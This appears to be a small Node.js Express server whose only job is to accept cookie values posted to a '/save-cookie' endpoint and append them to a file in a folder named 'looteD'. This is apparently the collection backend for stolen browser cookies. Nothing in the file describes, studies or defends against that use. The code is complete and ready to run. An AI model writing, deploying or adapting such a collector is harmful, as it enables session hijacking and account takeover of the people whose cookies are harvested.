const express = require('express');
const fs = require('fs-extra');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;
const filePath = 'D:/Aoo Usa looteD/cookies.txt';

app.use(bodyParser.json());

app.post('/save-cookie', async (req, res) => {
    const cookie = req.body.cookie;
    try {
        // Ensure the file exists and create it if it doesn't
        await fs.ensureFile(filePath);

        // Append the cookie to the file
        await fs.appendFile(filePath, cookie + '\n');
        console.log('Cookie saved:', cookie);
        res.send({ success: true });
    } catch (err) {
        console.error('Error writing to file:', err);
        res.status(500).send({ success: false });
    }
});

app.use(express.static('public'));

app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});
